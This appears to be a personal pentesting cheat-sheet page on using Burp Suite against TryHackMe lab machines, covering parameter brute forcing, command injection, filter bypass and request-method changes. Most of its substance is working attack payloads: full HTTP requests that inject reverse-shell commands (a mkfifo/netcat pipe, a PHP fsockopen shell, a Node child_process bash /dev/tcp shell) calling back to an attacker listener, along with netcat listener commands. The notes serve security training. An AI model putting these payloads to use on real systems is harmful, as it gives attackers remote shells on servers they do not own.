# Burp



## Find Parameters

Try using burp suite intruder to brute force to find other parameters&#x20;





## Command Injection

**Examples**

[hacker-vs.-hacker.md](../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")

Started using Burp while testing out payloads to url-encode payloads more easy.

**Kali**

```
nc lvnp 1337
```

Started using Burp while testing out payloads to url-encode payloads more easy.

**Burp**

```
GET /cvs/shell.pdf.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.9.104+1337+>/tmp/f HTTP/1.1
Host: 10.10.21.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```



<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bypass Filters - ;

try adding ; and then a command.

**Burp Request**

```
GET /index.php?path=;php+-r+'$sock%3dfsockopen("$KALI",1337)%3bexec("sh+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 10.10.128.4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Change Request Type

**Examples**

[glitch.md](../../walkthroughs/tryhackme/glitch.md "mention")

Change the request from GET to POST and it gives an interesting message

<figure><img src="../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

Running the below shows it is vulnerable

<figure><img src="../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

If it works try getting a shell

**Kali**

```
nc -lvnp
```

**Burp**

```
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/$KALI/1337+0>%261"') HTTP/1.1
Host: 10.10.22.153
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=value
Upgrade-Insecure-Requests: 1
```



<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

## Exploiting Vulnerable Password Reset Logic(OTP)

**Examples**

[#exploiting-vulnerable-password-reset-logic](enumeration-and-brute-force.md#exploiting-vulnerable-password-reset-logic "mention")

## Exploiting HTTP Basic Authentication

**Examples**

[#exploiting-http-basic-authentication](enumeration-and-brute-force.md#exploiting-http-basic-authentication "mention")

##



